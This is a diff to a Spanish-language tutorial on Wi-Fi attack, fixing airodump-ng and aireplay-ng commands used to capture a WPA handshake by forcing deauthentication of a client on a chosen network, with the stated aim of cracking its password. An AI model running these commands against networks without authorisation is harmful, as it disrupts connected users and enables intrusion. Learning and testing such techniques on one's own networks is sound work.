@@ -13,7 +13,7 @@ Lo que vamos a hacer es conseguir ese Handshake, en el cual gracias a ese Handsh
 Elegimos la red que queremos hacker, copiamos el `BSSID` que vendría siendo la dirección MAC del Access Point, nos vamos a otra terminal:
 
 ```bash
-sudo airodump-np wlan0mon --chanel 11 --bssid <BSSID> -w /home/<nuestro-usuario>/wordlist/Cap
+sudo airodump-ng wlan0mon --chanel 11 --bssid <BSSID> -w /home/<nuestro-usuario>/wordlist/Cap
 ```
 
 * `--chanel`: Lo obtenemos de `CH`
@@ -27,7 +27,7 @@ El Handshake lo obtenemos por medio de un ataque de **des-autenticación**.
 Para hacer esto, nos vamos a otra terminal y ponermos:
 
 ```bash
-sudo aireplay-ng -0 5 -a <BSSID> -c wlan0mon
+sudo aireplay-ng -0 5 -a <BSSID> -c <client-bssid> wlan0mon
 ```
 
 * `-0`: Es para elegir un ataque de des-autenticación y la cantidad de paquetes de des-autenticaciones queremos hacer
@@ -50,5 +50,6 @@ Debemos ver:
 ```plaintext
 ...[ WPA handshake: <Handshake> ]
 ```
+
 
 Ya con esto podemos hacer el ataque, podemos crackear la red Wi-Fi. También conseguimos el `PMKID`.
